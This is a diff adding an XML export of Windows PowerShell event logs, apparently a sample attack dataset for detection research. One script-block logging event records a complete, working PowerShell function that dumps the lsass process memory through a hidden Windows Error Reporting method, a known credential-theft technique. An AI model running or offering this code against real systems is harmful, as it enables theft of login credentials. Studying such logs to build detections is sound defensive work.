@@ -1,0 +1,139 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>40961</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>1</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2020-06-30T14:23:58.394425400Z" />
+      <EventRecordID>968</EventRecordID>
+      <Correlation ActivityID="{4aa5eae3-4f33-0000-501d-a64a334fd601}" />
+      <Execution ProcessID="7008" ThreadID="5532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-1000" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>53504</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>111</Task>
+      <Opcode>10</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2020-06-30T14:23:58.440339900Z" />
+      <EventRecordID>969</EventRecordID>
+      <Correlation ActivityID="{4aa5eae3-4f33-0000-501d-a64a334fd601}" />
+      <Execution ProcessID="7008" ThreadID="1916" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-1000" />
+    </System>
+    <EventData>
+      <Data Name="param1">7008</Data>
+      <Data Name="param2">DefaultAppDomain</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>40962</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>2</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2020-06-30T14:23:58.532115600Z" />
+      <EventRecordID>970</EventRecordID>
+      <Correlation ActivityID="{4aa5eae3-4f33-0000-501d-a64a334fd601}" />
+      <Execution ProcessID="7008" ThreadID="5532" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-1000" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>3</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2020-06-30T14:24:08.254605000Z" />
+      <EventRecordID>971</EventRecordID>
+      <Correlation ActivityID="{4aa5eae3-4f33-0001-3a2b-a64a334fd601}" />
+      <Execution ProcessID="7008" ThreadID="6488" />
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-21-3461203602-4096304019-2269080069-1000" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">function Memory($path)
+{
+			  
+			  
+		$Process = Get-Process lsass
+		$DumpFilePath = $path
+		
+		$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+		$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+		$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+		$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+		$MiniDumpWithFullMemory = [UInt32] 2
+	
+			
+			  #
+		$ProcessId = $Process.Id
+		$ProcessName = $Process.Name
+		$ProcessHandle = $Process.Handle
+		$ProcessFileName = "$($ProcessName).dmp"
+		
+		$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
+		
+		$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+			  
+		$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
+													$ProcessId,
+													$FileStream.SafeFileHandle,
+													$MiniDumpWithFullMemory,
+													[IntPtr]::Zero,
+													[IntPtr]::Zero,
+													[IntPtr]::Zero))
+			  
+		$FileStream.Close()
+		
+		if (-not $Result)
+		{
+			$Exception = New-Object ComponentModel.Win32Exception
+			$ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"
+			
+			# Remove any partially written dump files. For example, a partial dump will be written
+			# in the case when 32-bit PowerShell tries to dump a 64-bit process.
+			Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
+			
+			throw $ExceptionMessage
+		}
+		else
+		{
+			"Memdump complete!"
+		}
+	
+}</Data>
+      <Data Name="ScriptBlockId">27f08bda-c330-419f-b83b-eb5c0f699930</Data>
+      <Data Name="Path">C:\Users\Public\lsass_wer_ps.ps1</Data>
+    </EventData>
+  </Event>
+</root>
